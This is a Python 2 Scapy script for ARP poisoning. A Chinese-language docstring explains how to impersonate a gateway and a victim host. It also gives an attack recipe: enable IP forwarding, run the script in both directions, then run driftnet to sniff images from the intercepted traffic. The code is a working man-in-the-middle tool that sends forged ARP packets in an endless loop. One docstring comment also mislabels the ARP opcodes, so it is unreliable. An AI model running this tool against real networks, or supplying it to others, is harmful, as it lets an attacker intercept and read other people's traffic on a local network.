#!/usr/bin/python
#coding: utf-8

"""
op = 1为响应包   op = 2为请求包 
在18主机面前假冒网关: 
pkt = Ethre(src=[MAC: my], dst=[MAC: 18]) / ARP(hwsrc=[MAC: my], psrc=[IP: gw], hwdst=[MAC: 18], pdst=[IP: 18], op=[1|2]); 

在网关面前假冒自己是IP 18的主机 
pkt = Ethre(src=[MAC: my], dst=[MAC: gw]) / ARP(hwsrc=[MAC: my], psrc=[IP: 18], hwdst=[MAC: gw], pdst=[IP: gw], op=[1|2]); 

广播冒充自己是ip为18的主机 
pkt = Ethre(src=[MAC: my], dst=[MAC: ff]) / ARP(hwsrc=[MAC: my], psrc=[IP: 18], op=[1|2]); 

发送二层数据包 sendp(pkt, inter=2, iface=网卡) 

attack:
    # sysctl net.ipv4.ip_forward=1
    # ./arp.py -i eth0 -t 192.168.10.12 192.168.10.1
    # ./arp.py -i eth0 -t 192.168.10.1 192.168.10.12
    # driftnet
"""

import os
import sys
import signal 

from scapy.all import(
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)

from optparse import OptionParser

def main():

    # Run with the user: root
    if os.getuid() != 0:
        print "[-] Need root privileage!";
        sys.exit(2);


    # Msg for help
    usage       = "Usage: %prog [-i interface] [-m mode] [-t target] host"
    help_interface  = "Specify the interface.g. eth0";
    help_target = "Specify a host to Arp poison, default broadcast";
    help_mode   = "Run Mode[req|rep] send request or reply packet";


    # Option for command
    parser = OptionParser(usage);
    parser.add_option("-i",dest="interface", help=help_interface);
    parser.add_option("-t",dest="target", help=help_target);
    parser.add_option("-m",dest="mode", help=help_mode);
    (opts, args) = parser.parse_args();

    
    # Check if specify the interface for get MAC address
    if len(args) != 1 or opts.interface is None:
        print "[!] you must specify interface, like:eth0"
        parser.print_help();
        sys.exit(1);


    # about MAC:
    myMAC = get_if_hwaddr(opts.interface);
    
    if opts.target :
        yourMAC = getmacbyip(opts.target);
        if yourMAC is None:
            print "[-] Could not resolve target MAC address";
            sys.exit(3);

    else :  
        yourMAC = "ff:ff:ff:ff:ff:ff";


    # about mode:

    if opts.mode == "rep":
        opmode = 2;
    else:
        opmode = 1;


    # make package of arp poison
    def mkarp():
        if "ff" in yourMAC:
            pkt = Ether(src=myMAC, dst=yourMAC) / ARP(hwsrc=myMAC, psrc=args[0], op=opmode);
        else:
            pkt = Ether(src=myMAC, dst=yourMAC) / ARP(hwsrc=myMAC, psrc=args[0], hwdst=yourMAC, pdst=opts.target, op=opmode);

        return pkt;


    #loop send ARP poison
    pkt = mkarp();

    while True:
        sendp(pkt, inter=2, iface=opts.interface);


if __name__ == '__main__':
    main();
    

    
